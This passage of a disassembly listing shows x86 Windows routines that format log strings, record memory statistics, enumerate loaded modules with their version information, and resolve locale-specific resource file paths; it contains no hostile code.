                cmp     ax, si
                jnz     short loc_171CE
                push    esi
                sub     ecx, edx
                lea     eax, [ebp+var_114C]
                push    eax
                sar     ecx, 1
                lea     eax, [ecx+ecx]
                push    eax
                lea     eax, [ebp+var_A04]
                push    eax
                push    edi
                call    ebx

loc_171F3:                              ; CODE XREF: sub_1700A+199↑j
                mov     esi, 11Ch
                xor     eax, eax
                push    esi
                push    eax
                lea     eax, [ebp+var_1148]
                push    eax
                call    sub_16746
                add     esp, 0Ch
                lea     eax, [ebp+var_1148]
                push    eax
                mov     [ebp+var_1148], esi
                call    dword ptr ds:10010ECh
                test    eax, eax
                jz      short loc_17286
                lea     eax, [ebp+var_1134]
                push    eax
                push    [ebp+var_113C]
                lea     eax, [ebp+var_A04]
                push    [ebp+var_1140]
                push    [ebp+var_1144]
                push    1001988h
                push    400h
                push    eax
                call    sub_17577
                lea     ecx, [ebp+var_A04]
                add     esp, 1Ch
                lea     edx, [ecx+2]
                xor     esi, esi

loc_1725F:                              ; CODE XREF: sub_1700A+25E↓j
                mov     ax, [ecx]
                add     ecx, 2
                cmp     ax, si
                jnz     short loc_1725F
                push    esi
                sub     ecx, edx
                lea     eax, [ebp+var_114C]
                push    eax
                sar     ecx, 1
                lea     eax, [ecx+ecx]
                push    eax
                lea     eax, [ebp+var_A04]
                push    eax
                push    edi
                call    ebx
                jmp     short loc_17288
; ---------------------------------------------------------------------------

loc_17286:                              ; CODE XREF: sub_1700A+216↑j
                xor     esi, esi

loc_17288:                              ; CODE XREF: sub_1700A+27A↑j
                lea     eax, [ebp+var_1188]
                push    eax
                call    dword ptr ds:10010F4h
                movzx   eax, [ebp+var_1188]
                test    eax, eax
                jz      short loc_172C5
                cmp     eax, 6
                jz      short loc_172BE
                cmp     eax, 9
                lea     eax, [ebp+var_104]
                jz      short loc_172B7
                push    10019F4h
                jmp     short loc_172D0
; ---------------------------------------------------------------------------

loc_172B7:                              ; CODE XREF: sub_1700A+2A4↑j
                push    10019D4h
                jmp     short loc_172D0
; ---------------------------------------------------------------------------

loc_172BE:                              ; CODE XREF: sub_1700A+299↑j
                push    10019E0h
                jmp     short loc_172CA
; ---------------------------------------------------------------------------

loc_172C5:                              ; CODE XREF: sub_1700A+294↑j
                push    10019ECh

loc_172CA:                              ; CODE XREF: sub_1700A+2B9↑j
                lea     eax, [ebp+var_104]

loc_172D0:                              ; CODE XREF: sub_1700A+2AB↑j
                                        ; sub_1700A+2B2↑j
                push    80h
                push    eax
                call    sub_14A14
                lea     eax, [ebp+var_115C]
                mov     [ebp+var_115C], esi
                mov     esi, ds:1001070h
                push    eax
                call    esi
                push    eax
                call    dword ptr ds:10010E8h
                cmp     [ebp+var_115C], 0
                mov     eax, 1001A08h
                jnz     short loc_1730A
                mov     eax, 100182Ch

loc_1730A:                              ; CODE XREF: sub_1700A+2F9↑j
                cmp     [ebp+var_1174], 1
                mov     ecx, 1001A20h
                ja      short loc_1731D
                mov     ecx, 1001A38h

loc_1731D:                              ; CODE XREF: sub_1700A+30C↑j
                push    eax
                push    ecx
                lea     eax, [ebp+var_104]
                push    eax
                push    [ebp+var_1174]
                lea     eax, [ebp+var_A04]
                push    1001A4Ch
                push    400h
                push    eax
                call    sub_17577
                lea     ecx, [ebp+var_A04]
                add     esp, 1Ch
                lea     edx, [ecx+2]

loc_1734E:                              ; CODE XREF: sub_1700A+351↓j
                mov     ax, [ecx]
                add     ecx, 2
                cmp     ax, word ptr [ebp+var_1158]
                jnz     short loc_1734E
                xor     eax, eax
                push    eax
                sub     ecx, edx
                lea     eax, [ebp+var_114C]
                push    eax
                sar     ecx, 1
                lea     eax, [ecx+ecx]
                push    eax
                lea     eax, [ebp+var_A04]
                push    eax
                push    edi
                call    ebx
                lea     eax, [ebp+var_102C]
                push    eax
                call    dword ptr ds:10010FCh
                mov     eax, [ebp+var_101C]
                shr     eax, 14h
                push    eax
                mov     eax, [ebp+var_1018]
                shr     eax, 14h
                push    eax
                mov     eax, [ebp+var_1024]
                shr     eax, 14h
                push    eax
                mov     eax, [ebp+var_1020]
                shr     eax, 14h
                push    eax
                push    [ebp+var_1028]
                lea     eax, [ebp+var_A04]
                push    1001A88h
                push    400h
                push    eax
                call    sub_17577
                lea     ecx, [ebp+var_A04]
                add     esp, 20h
                lea     edx, [ecx+2]

loc_173D6:                              ; CODE XREF: sub_1700A+3D9↓j
                mov     ax, [ecx]
                add     ecx, 2
                cmp     ax, word ptr [ebp+var_1158]
                jnz     short loc_173D6
                xor     eax, eax
                push    eax
                sub     ecx, edx
                lea     eax, [ebp+var_114C]
                push    eax
                sar     ecx, 1
                lea     eax, [ecx+ecx]
                push    eax
                lea     eax, [ebp+var_A04]
                push    eax
                push    edi
                call    ebx
                xor     eax, eax
                mov     [ebp+var_1154], eax
                lea     eax, [ebp+var_1154]
                push    eax
                push    400h
                lea     eax, [ebp+var_2188]
                push    eax
                call    esi
                push    eax
                call    sub_1B080
                test    eax, eax
                jz      loc_17563
                mov     eax, [ebp+var_1154]
                mov     ecx, 1000h
                cmp     eax, ecx
                jbe     short loc_17443
                mov     eax, ecx
                mov     [ebp+var_1154], eax

loc_17443:                              ; CODE XREF: sub_1700A+42F↑j
                xor     ecx, ecx
                mov     esi, ecx
                test    eax, 0FFFFFFFCh
                jbe     loc_17563

loc_17452:                              ; CODE XREF: sub_1700A+553↓j
                push    104h
                lea     eax, [ebp+var_C0C]
                push    eax
                push    [ebp+esi*4+var_2188]
                call    dword ptr ds:1001070h
                push    eax
                call    sub_1B08C
                test    eax, eax
                jz      loc_17551
                lea     eax, [ebp+var_100C]
                push    eax
                xor     ecx, ecx
                push    400h
                push    ecx
                lea     eax, [ebp+var_C0C]
                push    eax
                mov     [ebp+var_1160], ecx
                call    sub_1B068
                test    eax, eax
                jz      short loc_174FD
                lea     eax, [ebp+var_1164]
                push    eax
                lea     eax, [ebp+var_1160]
                push    eax
                push    1001B20h
                lea     eax, [ebp+var_100C]
                push    eax
                call    sub_1B074
                test    eax, eax
                jz      short loc_174FD
                mov     ecx, [ebp+var_1160]
                movzx   eax, word ptr [ecx+14h]
                push    eax
                movzx   eax, word ptr [ecx+16h]
                push    eax
                movzx   eax, word ptr [ecx+10h]
                push    eax
                movzx   eax, word ptr [ecx+12h]
                push    eax
                lea     eax, [ebp+var_C0C]
                push    eax
                push    1001B28h
                lea     eax, [ebp+var_A04]
                push    400h
                push    eax
                call    sub_17577
                add     esp, 20h
                jmp     short loc_1751D
; ---------------------------------------------------------------------------

loc_174FD:                              ; CODE XREF: sub_1700A+492↑j
                                        ; sub_1700A+4B5↑j
                lea     eax, [ebp+var_C0C]
                push    eax
                push    1001B78h
                lea     eax, [ebp+var_A04]
                push    400h
                push    eax
                call    sub_17577
                add     esp, 10h

loc_1751D:                              ; CODE XREF: sub_1700A+4F1↑j
                lea     ecx, [ebp+var_A04]
                lea     edx, [ecx+2]

loc_17526:                              ; CODE XREF: sub_1700A+529↓j
                mov     ax, [ecx]
                add     ecx, 2
                cmp     ax, word ptr [ebp+var_1158]
                jnz     short loc_17526
                xor     eax, eax
                push    eax
                sub     ecx, edx
                lea     eax, [ebp+var_114C]
                push    eax
                sar     ecx, 1
                lea     eax, [ecx+ecx]
                push    eax
                lea     eax, [ebp+var_A04]
                push    eax
                push    edi
                call    ebx

loc_17551:                              ; CODE XREF: sub_1700A+469↑j
                mov     eax, [ebp+var_1154]
                inc     esi
                shr     eax, 2
                cmp     esi, eax
                jb      loc_17452

loc_17563:                              ; CODE XREF: sub_1700A+41C↑j
                                        ; sub_1700A+442↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    sub_165AB
                leave
                retn
sub_1700A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17577       proc near               ; CODE XREF: sub_1700A+100↑p
                                        ; sub_1700A+14E↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = byte ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                push    edi
                mov     edi, [ebp+arg_4]
                xor     esi, esi
                test    edi, edi
                jz      short loc_1758F
                cmp     edi, 7FFFFFFFh
                jbe     short loc_17594

loc_1758F:                              ; CODE XREF: sub_17577+E↑j
                mov     esi, 80070057h

loc_17594:                              ; CODE XREF: sub_17577+16↑j
                test    esi, esi
                js      short loc_175C9
                push    ebx
                mov     ebx, [ebp+arg_0]
                lea     eax, [ebp+arg_C]
                push    eax
                push    [ebp+arg_8]
                xor     esi, esi
                dec     edi
                push    edi
                push    ebx
                call    dword ptr ds:10011F0h
                add     esp, 10h
                test    eax, eax
                js      short loc_175BD
                cmp     eax, edi
                ja      short loc_175BD
                jnz     short loc_175C8
                jmp     short loc_175C2
; ---------------------------------------------------------------------------

loc_175BD:                              ; CODE XREF: sub_17577+3C↑j
                                        ; sub_17577+40↑j
                mov     esi, 8007007Ah

loc_175C2:                              ; CODE XREF: sub_17577+44↑j
                xor     eax, eax
                mov     [ebx+edi*2], ax

loc_175C8:                              ; CODE XREF: sub_17577+42↑j
                pop     ebx

loc_175C9:                              ; CODE XREF: sub_17577+1F↑j
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebp
                retn
sub_17577       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_175D4       proc near               ; CODE XREF: sub_16E67+18↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                call    dword ptr ds:1001100h
                movzx   eax, ax
                push    eax
                push    [ebp+arg_0]
                call    sub_175F4
                pop     ebp
                retn    4
sub_175D4       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_175F4       proc near               ; CODE XREF: sub_175D4+12↑p

var_210         = byte ptr -210h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 210h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     ecx, [ebp+arg_0]
                mov     edx, [ebp+arg_4]
                push    0
                lea     eax, [ebp+var_210]
                push    105h
                push    eax
                call    sub_176EF
                add     esp, 0Ch
                test    al, al
                jnz     short loc_1762D
                xor     eax, eax
                jmp     short loc_1763A
; ---------------------------------------------------------------------------

loc_1762D:                              ; CODE XREF: sub_175F4+33↑j
                lea     eax, [ebp+var_210]
                push    eax
                call    dword ptr ds:10010D0h

loc_1763A:                              ; CODE XREF: sub_175F4+37↑j
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    sub_165AB
                leave
                retn    8
sub_175F4       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1764D       proc near               ; CODE XREF: sub_176EF+89↓p

var_214         = dword ptr -214h
var_210         = byte ptr -210h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 214h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebx
                push    esi
                mov     esi, ecx
                push    105h
                lea     ecx, [ebp+var_210]
                push    ecx
                push    eax
                mov     ebx, edx
                call    dword ptr ds:1001060h
                test    eax, eax
                jz      short loc_176DA
                lea     eax, [ebp+var_214]
                push    eax
                push    esi
                push    [ebp+arg_4]
                lea     eax, [ebp+var_210]
                push    eax
                call    dword ptr ds:10010CCh
                test    eax, eax
                jz      short loc_176DA
                cmp     eax, [ebp+arg_4]
                ja      short loc_176DA
                xor     eax, eax
                cmp     ax, [ebx]
                jnz     short loc_176BD
                push    [ebp+var_214]
                mov     ecx, [ebp+arg_8]
                call    sub_17A6F
                pop     ecx
                test    al, al
                jz      short loc_176DA

loc_176BD:                              ; CODE XREF: sub_1764D+5B↑j
                mov     ecx, [ebp+var_214]
                xor     eax, eax
                mov     [ecx], ax
                mov     eax, [ebp+arg_8]
                push    1001BC8h
                mov     esi, ebx
                call    sub_178C7
                pop     ecx
                jmp     short loc_176DC
; ---------------------------------------------------------------------------

loc_176DA:                              ; CODE XREF: sub_1764D+33↑j
                                        ; sub_1764D+4F↑j ...
                xor     al, al

loc_176DC:                              ; CODE XREF: sub_1764D+8B↑j
                mov     ecx, [ebp+var_4]
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    sub_165AB
                leave
                retn
sub_1764D       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_176EF       proc near               ; CODE XREF: sub_175F4+29↑p

var_420         = dword ptr -420h
var_41C         = byte ptr -41Ch
var_210         = word ptr -210h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 420h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_8]
                push    ebx
                push    esi
                mov     esi, edx
                xor     edx, edx
                push    edi
                mov     edi, [ebp+arg_0]
                mov     [ebp+var_210], dx
                mov     [ebp+var_420], ecx
                mov     edx, 105h
                test    eax, eax
                jz      short loc_1774C
                push    eax
                mov     ecx, edx
                lea     ebx, [ebp+var_210]
                call    sub_17A6F
                pop     ecx
                test    al, al
                jnz     short loc_17741

loc_1773A:                              ; CODE XREF: sub_176EF+93↓j
                xor     al, al
                jmp     loc_1786A
; ---------------------------------------------------------------------------

loc_17741:                              ; CODE XREF: sub_176EF+49↑j
                mov     ecx, [ebp+var_420]
                mov     edx, 105h

loc_1774C:                              ; CODE XREF: sub_176EF+36↑j
                movzx   eax, si
                cmp     eax, 0C04h
                jz      short loc_17764
                cmp     eax, 1004h
                jnz     short loc_17769
                mov     esi, 804h
                jmp     short loc_17769
; ---------------------------------------------------------------------------

loc_17764:                              ; CODE XREF: sub_176EF+65↑j
                mov     esi, 404h

loc_17769:                              ; CODE XREF: sub_176EF+6C↑j
                                        ; sub_176EF+73↑j
                push    edx
                push    edx
                push    ecx
                lea     edx, [ebp+var_210]
                lea     ecx, [ebp+var_41C]
                call    sub_1764D
                add     esp, 0Ch
                test    al, al
                jz      short loc_1773A
                lea     eax, [ebp+var_41C]
                push    eax
                push    esi
                push    [ebp+arg_4]
                mov     edx, 1001BD4h
                push    edi
                lea     ecx, [ebp+var_210]
                call    sub_17975
                push    edi
                call    sub_1787E
                add     esp, 14h
                test    al, al
                jz      short loc_177B4

loc_177AD:                              ; CODE XREF: sub_176EF+E9↓j
                                        ; sub_176EF+11C↓j ...
                mov     al, 1
                jmp     loc_1786A
; ---------------------------------------------------------------------------

loc_177B4:                              ; CODE XREF: sub_176EF+BC↑j
                lea     eax, [ebp+var_41C]
                push    eax
                push    esi
                push    [ebp+arg_4]
                xor     edx, edx
                push    edi
                lea     ecx, [ebp+var_210]
                call    sub_17975
                push    edi
                call    sub_1787E
                add     esp, 14h
                test    al, al
                jnz     short loc_177AD
                mov     ebx, 409h
                cmp     bx, si
                jz      short loc_17837
                lea     eax, [ebp+var_41C]
                push    eax
                push    ebx
                push    [ebp+arg_4]
                mov     edx, 1001BD4h
                push    edi
                lea     ecx, [ebp+var_210]
                call    sub_17975
                push    edi
                call    sub_1787E
                add     esp, 14h
                test    al, al
                jnz     short loc_177AD
                lea     eax, [ebp+var_41C]
                push    eax
                push    ebx
                push    [ebp+arg_4]
                xor     edx, edx
                push    edi
                lea     ecx, [ebp+var_210]
                call    sub_17975
                push    edi
                call    sub_1787E
                add     esp, 14h
                test    al, al
                jnz     loc_177AD

loc_17837:                              ; CODE XREF: sub_176EF+F3↑j
                mov     ecx, [ebp+arg_4]
                lea     eax, [ebp+var_41C]
                push    eax
                mov     ebx, edi
                call    sub_17A6F
                pop     ecx
                test    al, al
                jz      short loc_1785E
                lea     eax, [ebp+var_210]
                push    eax
                push    [ebp+arg_4]
                call    sub_17908
                pop     ecx
                pop     ecx

loc_1785E:                              ; CODE XREF: sub_176EF+15C↑j
                push    edi
                call    sub_1787E
                test    al, al
                pop     ecx
                setnz   al

loc_1786A:                              ; CODE XREF: sub_176EF+4D↑j
                                        ; sub_176EF+C0↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    sub_165AB
                leave
                retn
sub_176EF       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1787E       proc near               ; CODE XREF: sub_176EF+B2↑p
                                        ; sub_176EF+DF↑p ...

var_254         = byte ptr -254h
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 254h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                lea     ecx, [ebp+var_254]
                push    ecx
                push    eax
                call    dword ptr ds:10010C8h
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_178AD
                xor     al, al
                jmp     short loc_178B6
; ---------------------------------------------------------------------------

loc_178AD:                              ; CODE XREF: sub_1787E+29↑j
                push    eax
                call    dword ptr ds:10010D4h
                mov     al, 1

loc_178B6:                              ; CODE XREF: sub_1787E+2D↑j
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                call    sub_165AB
                leave
                retn
sub_1787E       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_178C7       proc near               ; CODE XREF: sub_1764D+85↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    edi
                mov     ecx, esi
                mov     edi, eax
                call    sub_17A5A
                push    2Eh ; '.'
                mov     edx, eax
                pop     ecx

loc_178DC:                              ; CODE XREF: sub_178C7+1E↓j
                test    edx, edx
                jz      short loc_178E7
                dec     edx
                cmp     cx, [esi+edx*2]
                jnz     short loc_178DC

loc_178E7:                              ; CODE XREF: sub_178C7+17↑j
                cmp     cx, [esi+edx*2]
                jz      short loc_178EF
                mov     edx, eax

loc_178EF:                              ; CODE XREF: sub_178C7+24↑j
                push    [ebp+arg_0]
                sub     edi, edx
                lea     ebx, [esi+edx*2]
                mov     ecx, edi
                call    sub_17A6F
                pop     ecx
                pop     edi
                pop     ebx
                pop     ebp
                retn
sub_178C7       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17908       proc near               ; CODE XREF: sub_176EF+168↑p
                                        ; sub_17975+47↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     ecx, edi
                call    sub_17A5A
                mov     esi, eax
                test    esi, esi
                jz      short loc_1791F
                lea     eax, [esi-1]

loc_1791F:                              ; CODE XREF: sub_17908+12↑j
                movzx   eax, word ptr [edi+eax*2]
                push    5Ch ; '\'
                pop     edx
                cmp     dx, ax
                jz      short loc_1795B
                push    2Fh ; '/'
                pop     ecx
                cmp     cx, ax
                jz      short loc_1795B
                mov     eax, [ebp+arg_4]
                movzx   eax, word ptr [eax]
                cmp     dx, ax
                jz      short loc_1795B
                cmp     cx, ax
                jz      short loc_1795B
                mov     ecx, [ebp+arg_0]
                push    1001B20h
                sub     ecx, esi
                lea     ebx, [edi+esi*2]
                call    sub_17A6F
                pop     ecx
                test    al, al
                jz      short loc_1796C
                inc     esi

loc_1795B:                              ; CODE XREF: sub_17908+21↑j
                                        ; sub_17908+29↑j ...
                mov     ecx, [ebp+arg_0]
                push    [ebp+arg_4]
                sub     ecx, esi
                lea     ebx, [edi+esi*2]
                call    sub_17A6F
                pop     ecx

loc_1796C:                              ; CODE XREF: sub_17908+50↑j
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_17908       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17975       proc near               ; CODE XREF: sub_176EF+AC↑p
                                        ; sub_176EF+D9↑p ...

var_60          = dword ptr -60h
var_5C          = dword ptr -5Ch
var_58          = word ptr -58h
var_56          = byte ptr -56h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = word ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 60h
                mov     eax, ds:100C088h
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_C]
                push    ebx
                mov     ebx, [ebp+arg_0]
                push    esi
                mov     [ebp+var_60], ecx
                mov     ecx, [ebp+arg_4]
                push    eax
                mov     esi, edx
                call    sub_17A6F
                pop     ecx
                test    al, al
                jz      loc_17A47
                push    edi
                test    esi, esi
                jz      short loc_179C7
                xor     eax, eax
                cmp     ax, [esi]
                jz      short loc_179C7
                push    1001BE8h
                push    [ebp+arg_4]
                mov     edi, ebx
                call    sub_17908
                pop     ecx
                pop     ecx
                test    al, al
                jz      short loc_17A30

loc_179C7:                              ; CODE XREF: sub_17975+34↑j
                                        ; sub_17975+3B↑j
                movzx   eax, [ebp+arg_8]
                xor     ecx, ecx
                mov     [ebp+var_58], cx
                lea     edi, [ebp+var_58]
                lea     esi, [ebp+var_56]
                inc     ecx

loc_179D8:                              ; CODE XREF: sub_17975+88↓j
                xor     edx, edx
                mov     [ebp+var_5C], 0Ah
                div     [ebp+var_5C]
                push    2
                mov     [ebp+var_5C], eax
                lea     eax, [edx+30h]
                mov     [esi], ax
                mov     eax, [ebp+var_5C]
                pop     edx
                add     esi, edx
                test    eax, eax
                jz      short loc_179FF
                inc     ecx
                cmp     ecx, 29h ; ')'
                jb      short loc_179D8

loc_179FF:                              ; CODE XREF: sub_17975+82↑j
                sub     esi, edx
                lea     eax, [ebp+var_58]
                cmp     eax, esi
                jnb     short loc_17A1C

loc_17A08:                              ; CODE XREF: sub_17975+A5↓j
                movzx   ecx, word ptr [edi]
                mov     ax, [esi]
                mov     [edi], ax
                mov     [esi], cx
                add     edi, edx
                sub     esi, edx
                cmp     edi, esi
                jb      short loc_17A08

loc_17A1C:                              ; CODE XREF: sub_17975+91↑j
                lea     eax, [ebp+var_58]
                push    eax
                push    [ebp+arg_4]
                mov     edi, ebx
                call    sub_17908
                pop     ecx
                pop     ecx
                test    al, al
                jnz     short loc_17A34

loc_17A30:                              ; CODE XREF: sub_17975+50↑j
                xor     al, al
                jmp     short loc_17A46
; ---------------------------------------------------------------------------

loc_17A34:                              ; CODE XREF: sub_17975+B9↑j
                push    [ebp+var_60]
                push    [ebp+arg_4]
                call    sub_17908
                pop     ecx
                test    al, al
                pop     ecx
                setnz   al

loc_17A46:                              ; CODE XREF: sub_17975+BD↑j
                pop     edi

loc_17A47:                              ; CODE XREF: sub_17975+2B↑j
                mov     ecx, [ebp+var_4]
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    sub_165AB
                leave
                retn
sub_17975       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_17A5A       proc near               ; CODE XREF: sub_178C7+B↑p
                                        ; sub_17908+9↑p
                xor     eax, eax
                jmp     short loc_17A62
; ---------------------------------------------------------------------------

loc_17A5E:                              ; CODE XREF: sub_17A5A+D↓j
                add     ecx, 2
                inc     eax

loc_17A62:                              ; CODE XREF: sub_17A5A+2↑j
                xor     edx, edx
                cmp     dx, [ecx]
                jnz     short loc_17A5E
                retn
sub_17A5A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17A6F       proc near               ; CODE XREF: sub_1764D+66↑p
                                        ; sub_176EF+41↑p ...

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                mov     edx, [ebp+arg_0]
                test    ecx, ecx
                jnz     short loc_17A88

loc_17A7C:                              ; CODE XREF: sub_17A6F+52↓j
                push    7Ah ; 'z'
                call    dword ptr ds:10010D8h
                xor     al, al
                leave
                retn
; ---------------------------------------------------------------------------

loc_17A88:                              ; CODE XREF: sub_17A6F+B↑j
                push    edi
                lea     edi, [ecx-1]
                xor     eax, eax
                test    edi, edi
                jz      short loc_17AB6
                push    esi
                mov     esi, ebx
                mov     ecx, edx
                sub     esi, edx

loc_17A99:                              ; CODE XREF: sub_17A6F+41↓j
                movzx   edx, word ptr [ecx]
                and     [ebp+var_4], 0
                cmp     word ptr [ebp+var_4], dx
                jz      short loc_17AB2
                mov     [esi+ecx], dx
                inc     eax
                add     ecx, 2
                cmp     eax, edi
                jb      short loc_17A99

loc_17AB2:                              ; CODE XREF: sub_17A6F+35↑j
                mov     edx, [ebp+arg_0]
                pop     esi

loc_17AB6:                              ; CODE XREF: sub_17A6F+21↑j
                xor     ecx, ecx
                mov     [ebx+eax*2], cx
                pop     edi
                cmp     cx, [edx+eax*2]
                jnz     short loc_17A7C
                mov     al, 1
                leave
                retn
sub_17A6F       endp

; ---------------------------------------------------------------------------
                db 11h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17AD8       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     ecx, [eax]
                mov     edx, [ecx+0Ch]
                push    0
                push    eax
                call    edx
                pop     ebp
                retn    4
sub_17AD8       endp

; ---------------------------------------------------------------------------
                db 0Ah dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_17AF8       proc near               ; CODE XREF: sub_19A48+2F↓p
                                        ; sub_19A48+3D↓p ...
                lea     eax, [ecx+0Ch]
                retn
sub_17AF8       endp

; ---------------------------------------------------------------------------
                db 0Ch dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17B08       proc near               ; CODE XREF: sub_17C58+19↓p
                                        ; sub_17C58+28↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_4]
                mov     ecx, [ebp+arg_0]
                push    esi
                push    edi
                mov     esi, 10h

loc_17B1A:                              ; CODE XREF: sub_17B08+24↓j
                mov     edx, [ecx]
                cmp     edx, [eax]
                jnz     short loc_17B32
                sub     esi, 4
                add     eax, 4
                add     ecx, 4
                cmp     esi, 4
                jnb     short loc_17B1A
                test    esi, esi
                jz      short loc_17B9C

loc_17B32:                              ; CODE XREF: sub_17B08+16↑j
                movzx   edx, byte ptr [ecx]
                movzx   edi, byte ptr [eax]
                sub     edx, edi
                jnz     short loc_17B81
                sub     esi, 1
                add     eax, 1
                add     ecx, 1
                test    esi, esi
                jz      short loc_17B9C
                movzx   edx, byte ptr [ecx]
                movzx   edi, byte ptr [eax]
                sub     edx, edi
                jnz     short loc_17B81
                sub     esi, 1
                add     eax, 1
                add     ecx, 1
                test    esi, esi
                jz      short loc_17B9C
                movzx   edx, byte ptr [ecx]
                movzx   edi, byte ptr [eax]
                sub     edx, edi
                jnz     short loc_17B81
                sub     esi, 1
                add     eax, 1
                add     ecx, 1
                test    esi, esi
                jz      short loc_17B9C
                movzx   edx, byte ptr [ecx]
                movzx   eax, byte ptr [eax]
                sub     edx, eax
                jz      short loc_17B9C

loc_17B81:                              ; CODE XREF: sub_17B08+32↑j
                                        ; sub_17B08+49↑j ...
                test    edx, edx
                mov     eax, 1
                jg      short loc_17B9E
                or      eax, 0FFFFFFFFh
                xor     ecx, ecx
                test    eax, eax
                setz    cl
                pop     edi
                pop     esi
                mov     eax, ecx
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_17B9C:                              ; CODE XREF: sub_17B08+28↑j
                                        ; sub_17B08+3F↑j ...
                xor     eax, eax

loc_17B9E:                              ; CODE XREF: sub_17B08+80↑j
                xor     ecx, ecx
                test    eax, eax
                setz    cl
                pop     edi
                pop     esi
                mov     eax, ecx
                pop     ebp
                retn    8
sub_17B08       endp

; ---------------------------------------------------------------------------
                db 0Bh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_17BB8       proc near               ; CODE XREF: sub_17F78+90↓p
                                        ; sub_17F78+F7↓p

var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AA70h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 0Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                xor     esi, esi
                mov     [ebp+var_4], esi
                push    esi
                mov     ecx, [ebp+arg_0]
                call    sub_18EB8
                jmp     short loc_17C2A
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                mov     edx, [ecx]
                mov     [ebp+var_1C], edx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_1C]
                cmp     esi, 0C00000FDh
